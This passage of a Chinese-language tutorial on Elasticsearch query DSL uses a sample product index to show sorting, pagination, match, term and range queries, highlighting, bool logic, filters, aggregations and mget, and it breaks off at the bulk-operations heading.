水滴全面屏拍照智能游戏手机&quot;,&quot;price&quot;:2799,&quot;intro&quot;:&quot;限时优惠200，成交价2799！索尼4800万广角微距三摄，屏下指纹解锁！&quot;,&quot;brand&quot;:&quot;小米&quot;&#125;</span><br><span class="line">&#123;&quot;create&quot;:&#123;&quot;_id&quot;: 11&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:11,&quot;title&quot;:&quot;小米(MI)Pro 2019款 15.6英寸金属轻薄笔记本(第八代英特尔酷睿i7-8550U 16G 512GSSD MX250 2G独显) 深空灰&quot;,&quot;price&quot;:6899,&quot;intro&quot;:&quot;【PCIE固态硬盘、72%NTSC高色域全高清屏】B面康宁玻璃覆盖、16G双通道大内存、第八代酷睿I7处理器、专业级调校MX150&quot;,&quot;brand&quot;:&quot;小米&quot;&#125;</span><br><span class="line">&#123;&quot;create&quot;:&#123;&quot;_id&quot;: 12&#125;&#125;</span><br><span class="line">&#123;&quot;id&quot;:12,&quot;title&quot;:&quot;联想(Lenovo)拯救者Y7000P 2019英特尔酷睿i7 15.6英寸游戏笔记本电脑(i7 9750H 16G 1T SSD GTX1660Ti 144Hz)&quot;,&quot;price&quot;:9299,&quot;intro&quot;:&quot;超大1T固态，升级双通道16G内存一步到位，GTX1660Ti电竞级独显，英特尔9代i7H高性能处理器，144Hz电竞屏窄边框！&quot;,&quot;brand&quot;:&quot;联想&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>Elasticsearch 基于 JSON 提供完整的查询 DSL（Domain Specific Language：领域特定语言）来定义查询。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">基本语法：</span><br><span class="line">GET /索引名/类型名/_search</span><br></pre></td></tr></table></figure>
<p>一般都是需要配合查询参数来使用的，配合不同的参数有不同的查询效果</p>
<p>参数配置项可以参考博客：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/6333940621ec">https://www.jianshu.com/p/6333940621ec</a></p>
<h3 id="结果排序"><a class="markdownIt-Anchor" href="#结果排序">#</a> 结果排序</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">参数格式：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;sort&quot;: [</span><br><span class="line">    &#123;field: 排序规则&#125;,</span><br><span class="line">    ...</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">排序</span><br><span class="line">GET /shop_product/shop_product/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;sort&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;price&quot;: &#123;</span><br><span class="line">        &quot;order&quot;: &quot;desc&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">排序规则：</span><br><span class="line">asc表示升序</span><br><span class="line">desc:表示降序</span><br><span class="line">没有配置排序的情况下，默认按照评分降序排列</span><br></pre></td></tr></table></figure>
<h3 id="分页查询"><a class="markdownIt-Anchor" href="#分页查询">#</a> 分页查询</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">参数格式：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;from&quot;: start,</span><br><span class="line">  &quot;size&quot;: pageSize</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">分页 从第几个开始 每页几个</span><br><span class="line">GET /shop_product/shop_product/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;from&quot;: 2,</span><br><span class="line">  &quot;size&quot;: 4,</span><br><span class="line">  &quot;sort&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;price&quot;: &#123;</span><br><span class="line">        &quot;order&quot;: &quot;desc&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">需求1：查询所有文档按照价格降序排列</span><br><span class="line">需求2：分页查询文档按照价格降序排列，显示第2页，每页显示3个</span><br></pre></td></tr></table></figure>
<h3 id="检索查询"><a class="markdownIt-Anchor" href="#检索查询">#</a> 检索查询</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">参数格式：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    检索方式: &#123;field: value&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">检索查询 全文检索</span><br><span class="line">需求1：查询商品标题中符合&quot;游戏 手机&quot;的字样的商品</span><br><span class="line">GET /shop_product/shop_product/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;match&quot;: &#123;</span><br><span class="line">      &quot;title&quot;: &quot;游戏 手机&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">检索查询 精准匹配</span><br><span class="line">需求2：查询商品价格等于15299的商品</span><br><span class="line">GET /shop_product/shop_product/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;term&quot;: &#123;</span><br><span class="line">      &quot;price&quot;: 15299</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">检索查询 范围检索</span><br><span class="line">需求3：查询商品价格在5000~10000之间商品，按照价格升序排列</span><br><span class="line">GET /shop_product/shop_product/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;range&quot;: &#123;</span><br><span class="line">      &quot;price&quot;: &#123;</span><br><span class="line">        &quot;gte&quot;: 5000,</span><br><span class="line">        &quot;lte&quot;: 10000</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;sort&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">      &quot;price&quot;: &#123;</span><br><span class="line">        &quot;order&quot;: &quot;asc&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">检索方式：</span><br><span class="line">term表示精确匹配，value值不会被分词器拆分，按照倒排索引匹配</span><br><span class="line">match表示全文检索，value值会被分词器拆分，然后去倒排索引中匹配</span><br><span class="line">range表示范围检索，其value值是一个对象，如&#123; &quot;range&quot;: &#123;field: &#123;比较规则: value, ...&#125;&#125; &#125;</span><br><span class="line">  比较规则有gt / gte / lt / lte 等</span><br><span class="line">  </span><br><span class="line">注意：term和match都能用在数值和字符上，range用在数值上</span><br><span class="line"></span><br><span class="line">需求1：查询商品标题中符合&quot;游戏 手机&quot;的字样的商品</span><br><span class="line">需求2：查询商品价格等于15299的商品</span><br><span class="line">需求3：查询商品价格在5000~10000之间商品，按照价格升序排列</span><br></pre></td></tr></table></figure>
<h3 id="关键字查询"><a class="markdownIt-Anchor" href="#关键字查询">#</a> 关键字查询</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">参数格式：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;multi_match&quot;: &#123;</span><br><span class="line">      &quot;query&quot;: value,</span><br><span class="line">      &quot;fields&quot;: [field1, field2, ...]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">关键字查询</span><br><span class="line">需求1：查询商品标题或简介中符合&quot;蓝牙 指纹 双卡&quot;的字样的商品</span><br><span class="line">GET /shop_product/shop_product/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;multi_match&quot;: &#123;</span><br><span class="line">      &quot;query&quot;: &quot;蓝牙 指纹 双卡&quot;,</span><br><span class="line">      &quot;fields&quot;: [&quot;title&quot;, &quot;intro&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">multi_match：表示在多个字段间做检索，只要其中一个字段满足条件就能查询出来，多用在字段上</span><br><span class="line"></span><br><span class="line">需求1：查询商品标题或简介中符合&quot;蓝牙 指纹 双卡&quot;的字样的商品</span><br></pre></td></tr></table></figure>
<h3 id="高亮显示"><a class="markdownIt-Anchor" href="#高亮显示">#</a> 高亮显示</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">参数格式：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123; ... &#125;,</span><br><span class="line">  &quot;highlight&quot;: &#123;</span><br><span class="line">    &quot;fields&quot;: &#123;</span><br><span class="line">      field1: &#123;&#125;,</span><br><span class="line">      field2: &#123;&#125;,</span><br><span class="line">      ...</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;pre_tags&quot;: 开始标签,</span><br><span class="line">    &quot;post_tags&quot; 结束标签</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">高亮显示</span><br><span class="line">需求1：查询商品标题或简介中符合&quot;蓝牙 指纹 双卡&quot;的字样的商品，并且高亮显示</span><br><span class="line">GET /shop_product/shop_product/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;multi_match&quot;: &#123;</span><br><span class="line">      &quot;query&quot;: &quot;蓝牙 指纹 双卡&quot;,</span><br><span class="line">      &quot;fields&quot;: [&quot;title&quot;, &quot;intro&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;highlight&quot;: &#123;</span><br><span class="line">    &quot;fields&quot;: &#123;</span><br><span class="line">      &quot;title&quot;: &#123;&#125;,</span><br><span class="line">      &quot;intro&quot;: &#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;pre_tags&quot;:&quot;&lt;h1&gt;&quot;,</span><br><span class="line">    &quot;post_tags&quot;:&quot;&lt;/h1&gt;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight：表示高亮显示，需要在fields中配置哪些字段中检索到该内容需要高亮显示</span><br><span class="line">  必须配合检索(term / match)一起使用</span><br><span class="line">  </span><br><span class="line">需求1：查询商品标题或简介中符合&quot;蓝牙 指纹 双卡&quot;的字样的商品，并且高亮显示</span><br></pre></td></tr></table></figure>
<h3 id="逻辑查询"><a class="markdownIt-Anchor" href="#逻辑查询">#</a> 逻辑查询</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">参数格式： </span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;bool&quot;: &#123;</span><br><span class="line">      逻辑规则: [</span><br><span class="line">        &#123;检索方式: &#123;field: value&#125;&#125;, </span><br><span class="line">        ...</span><br><span class="line">      ],</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">逻辑查询</span><br><span class="line">需求1：查询商品标题中符合&quot;i7&quot;的字样并且价格大于7000的商品</span><br><span class="line">GET /shop_product/shop_product/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;bool&quot;: &#123;</span><br><span class="line">      &quot;must&quot;: [</span><br><span class="line">        &#123;&quot;match&quot;: &#123;</span><br><span class="line">          &quot;title&quot;: &quot;i7&quot;</span><br><span class="line">        &#125;&#125;,</span><br><span class="line">        &#123;&quot;range&quot;: &#123;</span><br><span class="line">          &quot;price&quot;: &#123;</span><br><span class="line">            &quot;gt&quot;: 7000</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">逻辑查询</span><br><span class="line">需求2：查询商品标题中符合&quot;pro&quot;的字样或者价格在1000~3000的商品</span><br><span class="line">GET /shop_product/shop_product/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;bool&quot;: &#123;</span><br><span class="line">      &quot;should&quot;: [</span><br><span class="line">        &#123;&quot;match&quot;: &#123;</span><br><span class="line">          &quot;title&quot;: &quot;pro&quot;</span><br><span class="line">        &#125;&#125;,</span><br><span class="line">        &#123;&quot;range&quot;: &#123;</span><br><span class="line">          &quot;price&quot;: &#123;</span><br><span class="line">            &quot;gte&quot;: 1000,</span><br><span class="line">            &quot;lte&quot;: 3000</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">逻辑规则：must / should / must_not，相当于and / or / not</span><br><span class="line"></span><br><span class="line">需求1：查询商品标题中符合&quot;i7&quot;的字样并且价格大于7000的商品</span><br><span class="line">需求2：查询商品标题中符合&quot;pro&quot;的字样或者价格在1000~3000的商品</span><br></pre></td></tr></table></figure>
<h3 id="过滤查询"><a class="markdownIt-Anchor" href="#过滤查询">#</a> 过滤查询</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">参数格式：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;bool&quot;: &#123;</span><br><span class="line">      &quot;filter&quot;: [</span><br><span class="line">        &#123; 检索方式: &#123; field: value &#125; &#125;，            	</span><br><span class="line">        ...</span><br><span class="line">      ]</span><br><span class="line">    &#125;             </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">过滤查询 不评分</span><br><span class="line">GET /shop_product/shop_product/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;query&quot;: &#123;</span><br><span class="line">    &quot;bool&quot;: &#123;</span><br><span class="line">      &quot;filter&quot;: [</span><br><span class="line">        &#123;&quot;match&quot;: &#123;</span><br><span class="line">          &quot;title&quot;: &quot;pro&quot;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">从效果上讲过滤查询和检索查询能做一样的效果</span><br><span class="line">区别在于过滤查询不评分，结果能缓存，检索查询要评分，结果不缓存</span><br><span class="line">一般是不会直接使用过滤查询，都是在检索了一定数据的基础上再使用</span><br></pre></td></tr></table></figure>
<p>关于 filter 的更多认知推荐大家读这篇博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/laoyang360/article/details/80468757">https://blog.csdn.net/laoyang360/article/details/80468757</a></p>
<h3 id="分组查询"><a class="markdownIt-Anchor" href="#分组查询">#</a> 分组查询</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">参数格式：</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    自定义分组字段: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: 分组字段, </span><br><span class="line">        &quot;order&quot;: &#123;自定义统计字段:排序规则&#125;, </span><br><span class="line">        &quot;size&quot;: 10  //默认显示10组 </span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;aggs&quot;: &#123; //分组后的统计查询，相当于MySQL分组函数查询</span><br><span class="line">        自定义统计字段: &#123;</span><br><span class="line">          分组运算: &#123;</span><br><span class="line">            &quot;field&quot;: 统计字段</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">分组查询</span><br><span class="line">需求1：按照品牌分组，统计各品牌的数量</span><br><span class="line">GET /shop_product/shop_product/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;brand_group&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;brand&quot;, </span><br><span class="line">        &quot;order&quot;: &#123;&quot;brand_group&quot;:&quot;desc&quot;&#125;, </span><br><span class="line">        &quot;size&quot;: 10  </span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;aggs&quot;: &#123; </span><br><span class="line">        &quot;brand_group&quot;: &#123;</span><br><span class="line">          &quot;value_count&quot;: &#123;</span><br><span class="line">            &quot;field&quot;: &quot;id&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">分组查询</span><br><span class="line">需求2：按照品牌分组，统计各品牌的平均价格</span><br><span class="line">GET /shop_product/shop_product/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;brand_group&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;brand&quot;, </span><br><span class="line">        &quot;order&quot;: &#123;&quot;brand_group&quot;:&quot;desc&quot;&#125;, </span><br><span class="line">        &quot;size&quot;: 10  </span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;aggs&quot;: &#123; </span><br><span class="line">        &quot;brand_group&quot;: &#123;</span><br><span class="line">          &quot;avg&quot;: &#123;</span><br><span class="line">            &quot;field&quot;: &quot;price&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">分组查询</span><br><span class="line">需求3：按照品牌分组，统计各品牌的价格数据</span><br><span class="line">GET /shop_product/shop_product/_search</span><br><span class="line">&#123;</span><br><span class="line">  &quot;size&quot;: 0,</span><br><span class="line">  &quot;aggs&quot;: &#123;</span><br><span class="line">    &quot;brand_group_aggs&quot;: &#123;</span><br><span class="line">      &quot;terms&quot;: &#123;</span><br><span class="line">        &quot;field&quot;: &quot;brand&quot;, </span><br><span class="line">        &quot;order&quot;: &#123;&quot;brand_group_aggs.count&quot;:&quot;desc&quot;&#125;, </span><br><span class="line">        &quot;size&quot;: 10  </span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;aggs&quot;: &#123; </span><br><span class="line">        &quot;brand_group_aggs&quot;: &#123;</span><br><span class="line">          &quot;stats&quot;: &#123;</span><br><span class="line">            &quot;field&quot;: &quot;price&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;       </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">分组运算：avg / sum / min / max / value_count / stats(执行以上所有功能的)</span><br><span class="line">注意：这里是size=0其目的是为了不要显示hit内容，专注点放在观察分组上</span><br><span class="line"></span><br><span class="line">需求1：按照品牌分组，统计各品牌的数量</span><br><span class="line">需求2：按照品牌分组，统计各品牌的平均价格</span><br><span class="line">需求3：按照品牌分组，统计各品牌的价格数据</span><br></pre></td></tr></table></figure>
<h2 id="批处理了解"><a class="markdownIt-Anchor" href="#批处理了解">#</a> 批处理（了解）</h2>
<p>当需要集中的批量处理文档时，如果依然使用传统的操作单个 API 的方式，将会浪费大量网络资源，Elasticsearch 为了提高操作的性能，专门提供了批处理的 API</p>
<h3 id="mget批量查询"><a class="markdownIt-Anchor" href="#mget批量查询">#</a> mget 批量查询</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line">GET /索引名/类型/_mget</span><br><span class="line">&#123;</span><br><span class="line">  &quot;docs&quot;: [</span><br><span class="line">    &#123;&quot;_id&quot;: 文档ID&#125;,</span><br><span class="line">    ...</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="bulk批量增删改"><a class="markdownIt-Anchor" href="#bulk批量增删改">#</a> bulk 批量增删改</h3>
